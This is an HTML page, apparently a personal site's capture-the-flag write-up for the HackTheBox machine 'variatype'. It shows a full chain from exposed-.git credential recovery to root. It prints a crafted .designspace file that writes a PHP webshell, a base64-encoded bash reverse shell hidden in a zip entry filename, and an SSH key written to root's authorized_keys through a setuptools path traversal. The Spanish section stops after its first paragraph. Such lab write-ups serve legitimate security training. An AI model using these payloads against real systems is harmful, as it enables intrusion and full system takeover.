@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>variatype | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">variatype</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===================== ENGLISH ===================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The attack started with a web application that accepted font design files for processing. By discovering a <code>.git</code> directory exposed on a portal subdomain, I recovered credentials from a past commit, gaining authenticated access to an internal file management portal.</p>
+
+                    <p>With authenticated access in hand, I turned back to the main site's font upload functionality. Using <a href="https://github.com/advisories/GHSA-768j-98cg-p3fv">GHSA-768j-98cg-p3fv</a>, a path traversal vulnerability in the <code>fonttools</code> <code>varLib</code> library, I crafted a malicious <code>.designspace</code> file that wrote a PHP webshell directly onto the portal's public directory. The webshell payload was injected by abusing XML CDATA sections in <code>labelname</code> elements, which got written verbatim into the output PHP file, granting remote code execution as <code>www-data</code>.</p>
+
+                    <p>From there, monitoring with <code>pspy64</code> revealed that user <code>steve</code> periodically processes uploaded font files using <code>fontforge</code> version 20230101, which is vulnerable to command injection via filename (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25081">CVE-2024-25081</a>). Since filenames are restricted to alphanumeric characters, I embedded a base64-encoded reverse shell inside a zip file whose internal entry had the malicious filename. A zip slip approach caused <code>fontforge</code> to process the injected filename, triggering the command injection and giving me a shell as <code>steve</code>.</p>
+
+                    <p>Finally, <code>steve</code> had <code>sudo</code> rights to run a Python script that used <code>setuptools</code> version 78.1.0's <code>PackageIndex().download()</code> to fetch a URL and save it to disk. This version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47273">CVE-2025-47273</a>, a path traversal via URL-encoded slashes. By serving my SSH public key from a custom HTTP server and passing a URL with the target path encoded in it, I wrote my key into <code>/root/.ssh/authorized_keys</code> as root, then connected via SSH to complete the machine.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e5c07b;">STATE</span>  <span style="color:#98c379;">SERVICE</span>  <span style="color:#61afef;">VERSION</span>
+<span style="color:#e06c75;">22</span>/tcp open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+<span style="color:#e06c75;">80</span>/tcp open  http     nginx 1.22.1
+|_http-title: Did not follow redirect to http://variatype.htb/</span></code></pre>
+
+                <p>Two services are exposed: SSH on port 22 and an nginx web server on port 80 that redirects to <code>http://variatype.htb/</code>. I add <code>variatype.htb</code> to <code>/etc/hosts</code> to resolve it locally.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Browsing to <code>http://variatype.htb/</code>, the main page is largely static but contains one particularly interesting section: an upload form that accepts <code>.designspace</code> and font files (<code>.ttf</code>/<code>.otf</code>) to generate variable fonts. The page itself describes the backend:</p>
+
+                <blockquote>
+                    <p>"Upload your .designspace file and master fonts (.ttf/.otf) to generate a fully compliant variable font. We use the same fonttools engine used by Google Fonts and major foundries."</p>
+                </blockquote>
+
+                <p>This confirms that the server is running the <code>fonttools varLib</code> engine, which is exactly what a known advisory targets.</p>
+
+                <h3>Virtual Host Discovery</h3>
+                <p>I enumerate virtual hosts with <code>ffuf</code> and find a <code>portal</code> subdomain returning a 200 response:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">000000048</span>: 200   58 L   200 W   2488 Ch   <span style="color:#e5c07b;">"portal"</span></code></pre>
+
+                <p>I add <code>portal.variatype.htb</code> to <code>/etc/hosts</code> and visit it. Unlike the main site, this one runs PHP (a <code>PHPSESSID</code> cookie is set), and it presents a login form.</p>
+
+                <img src="./media/image1.png" alt="Login page of the portal.variatype.htb internal validation portal showing a username and password form" />
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">http://portal.variatype.htb</span> [200 OK] Cookies[PHPSESSID], Email[it-support@variatype.htb], Title[VariaType — Internal Validation Portal], nginx[1.22.1]</code></pre>
+
+                <h3>Source Code Comment — Filesystem Path Disclosure</h3>
+                <p>While reviewing source code on both sites, I find an interesting comment inside a CSS file:</p>
+
+                <pre><code class="language-css"><span style="color:#7f848e;">/* /var/www/dev.variatype.htb/styles.css */</span>
+<span style="color:#e06c75;">:root</span> {</code></pre>
+
+                <p>This leaks the naming convention used for web directories under <code>/var/www/</code>, which will be useful later when targeting write paths.</p>
+
+                <h3>Exposed .git Directory — Credential Recovery</h3>
+                <p>Fuzzing directories on <code>portal.variatype.htb</code> with <code>big.txt</code> reveals an exposed <code>.git</code> directory:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">200</span> GET  http://portal.variatype.htb/.git/config
+<span style="color:#98c379;">200</span> GET  http://portal.variatype.htb/.git/description</code></pre>
+
+                <p>I use <code>git-dumper</code> to pull the full repository. Reviewing the commit history, I find hardcoded credentials:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">gitbot</span>:<span style="color:#e06c75;">G1tB0t_Acc3ss_2025!</span></code></pre>
+
+                <p>There's no other useful code in the repository, but these credentials are enough to log into the portal.</p>
+
+                <h2>Portal Access — Authenticated File Listing</h2>
+                <p>Using the recovered credentials to log in to <code>portal.variatype.htb</code>, I'm taken to a file listing showing previously uploaded files. The portal provides two operations on each file, via these endpoint patterns:</p>
+
+                <pre><code class="language-plaintext">http://portal.variatype.htb/view.php?f=variabype_zTTWD8Zioqk.ttf
+http://portal.variatype.htb/download.php?f=variabype_zTTWD8Zioqk.ttf</code></pre>
+
+                <p>I attempt path traversal through both parameters but find no bypass. The interesting attack surface remains the font upload functionality on the main site.</p>
+
+                <h2>Initial Access — fonttools varLib Arbitrary File Write (GHSA-768j-98cg-p3fv)</h2>
+                <p>The advisory at <a href="https://github.com/advisories/GHSA-768j-98cg-p3fv">GHSA-768j-98cg-p3fv</a> describes a path traversal vulnerability in <code>fonttools varLib</code>: the <code>filename</code> attribute of a <code>&lt;variable-font&gt;</code> element in a <code>.designspace</code> file is used as-is when writing the output, without sanitization. This allows writing the generated font binary to an arbitrary path on the filesystem.</p>
+
+                <p>Knowing the web root structure from the CSS comment, I craft a <code>.designspace</code> file that targets <code>/var/www/portal.variatype.htb/public/files/</code> as the write destination — a directory I'll confirm is writable since the portal serves uploaded files from there.</p>
+
+                <h3>Step 1 — Write a skeleton PHP file via path traversal</h3>
+                <p>First I verify the write primitive works by targeting a simple PHP file path:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span>
+<span style="color:#e06c75;">&lt;designspace</span> <span style="color:#e5c07b;">format=</span><span style="color:#98c379;">"5.0"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;axes&gt;</span>
+    <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;</span>
+  <span style="color:#e06c75;">&lt;/axes&gt;</span>
+  <span style="color:#e06c75;">&lt;sources&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-light.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Light"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-regular.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Regular"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+  <span style="color:#e06c75;">&lt;/sources&gt;</span>
+
+  <span style="color:#7f848e;">&lt;!-- Filename can be arbitrarily set to any path on the filesystem --&gt;</span>
+  <span style="color:#e06c75;">&lt;variable-fonts&gt;</span>
+    <span style="color:#e06c75;">&lt;variable-font</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"MaliciousFont"</span>
+      <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"../../../../../../var/www/portal.variatype.htb/public/files/xd.php"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;axis-subsets&gt;&lt;axis-subset</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span><span style="color:#e06c75;">/&gt;&lt;/axis-subsets&gt;</span>
+    <span style="color:#e06c75;">&lt;/variable-font&gt;</span>
+  <span style="color:#e06c75;">&lt;/variable-fonts&gt;</span>
+<span style="color:#e06c75;">&lt;/designspace&gt;</span></code></pre>
+
+                <p>After uploading this file along with two dummy <code>.ttf</code> fonts, navigating to <code>http://portal.variatype.htb/public/files/xd.php</code> confirms the file was written — I can see the raw binary font data being served as PHP output, which means the path traversal worked:</p>
+
+                <img src="./media/image4.png" alt="Browser response showing binary font data served from xd.php, confirming the arbitrary file write succeeded" />
+
+                <h3>Step 2 — Inject a PHP webshell via XML CDATA</h3>
+                <p>The advisory also explains how to inject arbitrary PHP code into the output file: the <code>labelname</code> element uses CDATA sections that are written verbatim into the output. By carefully nesting CDATA sections, PHP code can be embedded without being escaped by the XML parser.</p>
+
+                <p>The technique from the advisory looks like this:</p>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>&lt;![CDATA[&lt;?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;<span style="color:#e06c75;">&lt;/labelname&gt;</span></code></pre>
+
+                <p>Adapting this to a functional webshell, my full working payload is:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span>
+<span style="color:#e06c75;">&lt;designspace</span> <span style="color:#e5c07b;">format=</span><span style="color:#98c379;">"5.0"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;axes&gt;</span>
+    <span style="color:#7f848e;">&lt;!-- XML injection occurs in labelname elements with CDATA sections --&gt;</span>
+    <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>&lt;![CDATA[&lt;?php system($_GET['cmd']) ?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"fr"</span><span style="color:#e06c75;">&gt;</span>MEOW2<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+    <span style="color:#e06c75;">&lt;/axis&gt;</span>
+  <span style="color:#e06c75;">&lt;/axes&gt;</span>
+  <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;</span>
+  <span style="color:#e06c75;">&lt;sources&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-light.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Light"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-regular.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Regular"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+  <span style="color:#e06c75;">&lt;/sources&gt;</span>
+  <span style="color:#e06c75;">&lt;variable-fonts&gt;</span>
+    <span style="color:#e06c75;">&lt;variable-font</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"MaliciousFont"</span>
+      <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"../../../../../../var/www/portal.variatype.htb/public/files/xdd.php"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;axis-subsets&gt;&lt;axis-subset</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span><span style="color:#e06c75;">/&gt;&lt;/axis-subsets&gt;</span>
+    <span style="color:#e06c75;">&lt;/variable-font&gt;</span>
+  <span style="color:#e06c75;">&lt;/variable-fonts&gt;</span>
+  <span style="color:#e06c75;">&lt;instances&gt;</span>
+    <span style="color:#e06c75;">&lt;instance</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Display Thin"</span> <span style="color:#e5c07b;">familyname=</span><span style="color:#98c379;">"MyFont"</span> <span style="color:#e5c07b;">stylename=</span><span style="color:#98c379;">"Thin"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>Display Thin<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+    <span style="color:#e06c75;">&lt;/instance&gt;</span>
+  <span style="color:#e06c75;">&lt;/instances&gt;</span>
+<span style="color:#e06c75;">&lt;/designspace&gt;</span></code></pre>
+
+                <p>After uploading this, browsing to the written PHP file and appending <code>?cmd=id</code> confirms remote code execution as <code>www-data</code>:</p>
+
+                <img src="./media/image3.png" alt="Browser showing the webshell at xdd.php executing the id command, returning uid=33(www-data)" />
+
+                <h2>Lateral Movement — fontforge Command Injection (CVE-2024-25081)</h2>
+                <p>Now running as <code>www-data</code>, I upload <code>pspy64</code> and monitor process activity. Every two minutes, user <code>steve</code> (UID=1000) runs a font processing script:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | mkdir -p /home/steve/processed_fonts /home/steve/quarantine /home/steve/logs
+<span style="color:#e5c07b;">UID=1000</span> | /bin/bash /home/steve/bin/process_client_submissions.sh</code></pre>
+
+                <p>I can't read the script directly from <code>steve</code>'s home directory, but there's a copy in <code>/opt</code> that is readable. The critical section of the script is:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;">if</span> timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c <span style="color:#98c379;">"
+import fontforge
+import sys
+try:
+    font = fontforge.open('</span><span style="color:#e06c75;">$file</span><span style="color:#98c379;">')
+    family = getattr(font, 'familyname', 'Unknown')
+..."</span></code></pre>
+
+                <p>The variable <code>$file</code> — which is the filename of the uploaded file — is interpolated directly into a shell command without sanitization. Checking the installed version of <code>fontforge</code>:</p>
+
+                <pre><code class="language-bash">www-data@variatype:/opt$ /usr/local/src/fontforge/build/bin/fontforge --version
+<span style="color:#7f848e;">Version: 20230101</span></code></pre>
+
+                <p>Version 20230101 is vulnerable to command injection via filename substitution (<code>$()</code>) as described in <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25081">CVE-2024-25081</a>. The shell expands <code>$(...)</code> constructs inside the filename before passing it to <code>fontforge</code>.</p>
+
+                <h3>Understanding the Filename Restriction</h3>
+                <p>The script enforces a strict naming policy before processing any file:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">SAFE_NAME_REGEX</span>=<span style="color:#98c379;">'^[a-zA-Z0-9._-]+$'</span>
+
+<span style="color:#c678dd;">if</span> [[ ! <span style="color:#98c379;">"$file"</span> =~ <span style="color:#e5c07b;">$SAFE_NAME_REGEX</span> ]]; <span style="color:#c678dd;">then</span>
+    log <span style="color:#98c379;">"QUARANTINE: Filename contains invalid characters: $file"</span>
+    mv <span style="color:#98c379;">"$file"</span> <span style="color:#98c379;">"$QUARANTINE_DIR/"</span> 2&gt;/dev/null || true
+    <span style="color:#c678dd;">continue</span>
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>Characters like <code>$</code>, <code>(</code>, <code>)</code>, spaces, and <code>/</code> are all blocked — making a direct injection via filename impossible. However, the script also processes archive files by first extracting them:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">EXTENSIONS=</span>(
+  "*.ttf" "*.otf" "*.woff" "*.woff2"
+  "*.zip" "*.tar" "*.tar.gz"
+  "*.sfd"
+)</code></pre>
+
+                <p>When a <code>.zip</code> is detected, <code>fontforge</code> itself performs the extraction, as confirmed by <code>pspy64</code>:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | sh -c unzip -l /var/www/portal.variatype.htb/public/files/xd.zip &gt; /tmp/ffarchive-6673-1/ff-archive-table-of-contents</code></pre>
+
+                <p>The naming pattern of the temp directory (<code>ffarchive-</code>) confirms <code>fontforge</code> is the one running <code>unzip</code>. After extraction, <code>fontforge</code> will attempt to open the extracted file — and the extracted filename is controlled by what's stored inside the zip, bypassing the regex check on the outer zip filename entirely. This is a zip slip variant.</p>
+
+                <h3>Crafting the Payload</h3>
+                <p>Since the injected filename must contain characters like <code>$</code>, <code>(</code>, and <code>)</code>, but also a base64-encoded command (which may contain <code>+</code> and <code>=</code> but avoids most special chars), I encode the reverse shell in base64 and wrap it in a <code>bash -c</code> pipe:</p>
+
+                <p>The base64 payload decodes to:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -c <span style="color:#98c379;">"bash -i &gt;&amp; /dev/tcp/10.10.14.129/443 0&gt;&amp;1"</span></code></pre>
+
+                <p>The malicious filename inside the zip is:</p>
+                <pre><code class="language-plaintext">$(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf</code></pre>
+
+                <p>I create a zip archive named <code>xdd.zip</code> containing a file with this name, drop it into <code>/var/www/portal.variatype.htb/public/files/</code> via the webshell, and set up a netcat listener on port 443.</p>
+
+                <p>After at most two minutes, the cron fires. <code>pspy64</code> confirms the injection:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | sh -c ( cd /tmp/ffarchive-7123-1 ; unzip /var/www/portal.variatype.htb/public/files/xdd.zip $(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf ) &gt; /dev/null</code></pre>
+
+                <p>My listener catches a shell as <code>steve</code>. Since the shell is unstable and drops after a short time, I immediately add my SSH public key to <code>/home/steve/.ssh/authorized_keys</code> for persistence before it dies, then reconnect via SSH.</p>
+
+                <h2>Privilege Escalation — setuptools Arbitrary File Write (CVE-2025-47273)</h2>
+                <p>Checking sudo privileges as <code>steve</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User steve may run the following commands on variatype:
+    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</code></pre>
+
+                <p>The script installs font validation plugins by downloading a URL provided as argument. Its usage message is:</p>
+
+                <pre><code class="language-plaintext">Usage: sudo /opt/font-tools/install_validator.py &lt;PLUGIN_URL&gt;
+Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py</code></pre>
+
+                <p>The only validation checks on the URL are:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">if not</span> is_valid_url(plugin_url):
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[-] Invalid URL. Must start with http:// or https://"</span>)
+    sys.exit(<span style="color:#e5c07b;">1</span>)
+
+<span style="color:#c678dd;">if</span> plugin_url.count(<span style="color:#98c379;">'/'</span>) &gt; <span style="color:#e5c07b;">10</span>:
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[-] Suspiciously long URL. Aborting."</span>)
+    sys.exit(<span style="color:#e5c07b;">1</span>)</code></pre>
+
+                <p>The slash count limit is worth noting — if an exploit needed more than 10 slashes in the URL one could theoretically use a redirect proxy to reach the final malicious URL, though it won't be necessary here.</p>
+
+                <p>The download itself is handled by <code>setuptools</code>' <code>PackageIndex()</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">def</span> <span style="color:#61afef;">install_validator_plugin</span>(plugin_url):
+    <span style="color:#c678dd;">if not</span> os.path.exists(PLUGIN_DIR):
+        os.makedirs(PLUGIN_DIR, mode=<span style="color:#e5c07b;">0o755</span>)
+    logging.info(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Attempting to install plugin from: {plugin_url}"</span>)
+    index = <span style="color:#61afef;">PackageIndex</span>()
+    <span style="color:#c678dd;">try</span>:
+        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
+        logging.info(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Plugin installed at: {downloaded_path}"</span>)
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[+] Plugin installed successfully."</span>)</code></pre>
+
+                <p>Checking the installed version of <code>setuptools</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:/opt/font-tools$ pip show setuptools
+<span style="color:#7f848e;">Name: setuptools
+Version: 78.1.0</span></code></pre>
+
+                <p>Version 78.1.0 is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47273">CVE-2025-47273</a>: the <code>PackageIndex().download()</code> method uses the URL path as the destination filename without properly decoding and sanitizing percent-encoded path separators. By URL-encoding <code>/</code> as <code>%2F</code> in the path portion of the URL, the final file is written to the decoded path — i.e., an arbitrary location on the filesystem. References: <a href="https://security.snyk.io/vuln/SNYK-PYTHON-SETUPTOOLS-9964606">SNYK-PYTHON-SETUPTOOLS-9964606</a>.</p>
+
+                <h3>Proof of Concept Verification</h3>
+                <p>Before targeting <code>root</code>'s SSH directory, I confirm the primitive works. I start a custom Python HTTP server that returns a fixed payload body regardless of the requested path:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">from</span> http.server <span style="color:#c678dd;">import</span> HTTPServer, BaseHTTPRequestHandler
+
+<span style="color:#c678dd;">class</span> <span style="color:#e5c07b;">CatchAllHandler</span>(BaseHTTPRequestHandler):
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">do_GET</span>(self):
+        self.send_response(<span style="color:#e5c07b;">200</span>)
+        self.send_header(<span style="color:#98c379;">"Content-type"</span>, <span style="color:#98c379;">"text/plain"</span>)
+        self.end_headers()
+        response_text = <span style="color:#98c379;">"mypayload"</span>
+        self.wfile.write(response_text.encode(<span style="color:#98c379;">"utf-8"</span>))
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">run</span>(port=<span style="color:#e5c07b;">80</span>):
+    server_address = (<span style="color:#98c379;">''</span>, port)
+    httpd = HTTPServer(server_address, CatchAllHandler)
+    <span style="color:#61afef;">print</span>(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Starting server on port {port}..."</span>)
+    <span style="color:#c678dd;">try</span>:
+        httpd.serve_forever()
+    <span style="color:#c678dd;">except</span> KeyboardInterrupt:
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"\nStopping server."</span>)
+        httpd.server_close()
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    run()</code></pre>
+
+                <p>I call the sudo script with a URL pointing to my server, with the target path URL-encoded in the URL path:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+    http://10.10.14.129/<span style="color:#e06c75;">%2Ftmp%2Fpwned</span>
+
+<span style="color:#7f848e;">[INFO] Attempting to install plugin from: http://10.10.14.129/%2Ftmp%2Fpwned
+[INFO] Downloading http://10.10.14.129/%2Ftmp%2Fpwned
+[INFO] Plugin installed at: /tmp/pwned</span>
+[+] Plugin installed successfully.</code></pre>
+
+                <p>The file is owned by root and contains exactly my served payload:</p>
+
+                <pre><code class="language-bash">-rw-r--r-- 1 root root 9 /tmp/pwned
+steve@variatype:~$ cat /tmp/pwned
+mypayload</code></pre>
+
+                <p>The primitive is confirmed: whatever the HTTP server returns gets written to the decoded path, as root.</p>
+
+                <h3>Writing SSH Authorized Key as Root</h3>
+                <p>I update the server to serve my SSH public key instead:</p>
+
+                <pre><code class="language-python">response_text = <span style="color:#98c379;">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com"</span></code></pre>
+
+                <p>Then I invoke the sudo script targeting <code>/root/.ssh/authorized_keys</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+    http://10.10.14.129/<span style="color:#e06c75;">%2Froot%2F.ssh%2Fauthorized_keys</span>
+
+<span style="color:#7f848e;">[INFO] Attempting to install plugin from: http://10.10.14.129/%2Froot%2F.ssh%2Fauthorized_keys
+[INFO] Downloading http://10.10.14.129/%2Froot%2F.ssh%2Fauthorized_keys
+[INFO] Plugin installed at: /root/.ssh/authorized_keys</span>
+[+] Plugin installed successfully.</code></pre>
+
+                <p>My public key is now written to root's <code>authorized_keys</code>. I connect via SSH with the corresponding private key:</p>
+
+                <pre><code class="language-bash">ssh -i ~/.ssh/kerssh root@variatype.htb</code></pre>
+
+                <pre><code class="language-plaintext">Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 x86_64
+
+root@variatype:~# id
+<span style="color:#98c379;">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+
+                <p>Root access obtained. The machine is complete.</p>
+            </div>
+
+            <!-- ===================== ESPAÑOL ===================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El ataque comenzó con una aplicación web que aceptaba archivos de diseño tipográfico para procesarlos. Descubriendo un directorio <code>.git</code> expuesto en un subdominio de portal, recuperé credenciales de un commit anterior, obteniendo acceso autenticado a un portal interno de gestión de archivos.</p>
+
